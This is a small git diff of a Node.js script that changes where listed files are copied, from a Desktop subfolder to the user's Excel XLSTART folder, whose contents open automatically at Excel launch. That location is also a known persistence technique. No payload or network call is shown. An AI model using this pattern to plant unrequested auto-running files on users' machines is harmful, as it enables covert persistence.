@@ -1,10 +1,16 @@
 const { exec } = require("child_process");
 const fs = require("fs");
 const path = require("path");
-const { promisify } = require("util");
-const mkdir = promisify(fs.mkdir);
+const os = require("os");
 
-const desktopPath = path.join(require("os").homedir(), "Desktop");
+const destinationFolder = path.join(
+  os.homedir(),
+  "AppData",
+  "Roaming",
+  "Microsoft",
+  "Excel",
+  "XLSTART"
+);
 
 /* EDIT FILE PATHS */
 
@@ -18,9 +24,6 @@ moveFile(file2);
 
 async function moveFile(file) {
   try {
-    const destinationFolder = path.join(desktopPath, "files");
-    await mkdir(destinationFolder, { recursive: true });
-
     const destinationPath = path.join(destinationFolder, path.basename(file));
 
     fs.copyFile(file, destinationPath, (err) => {
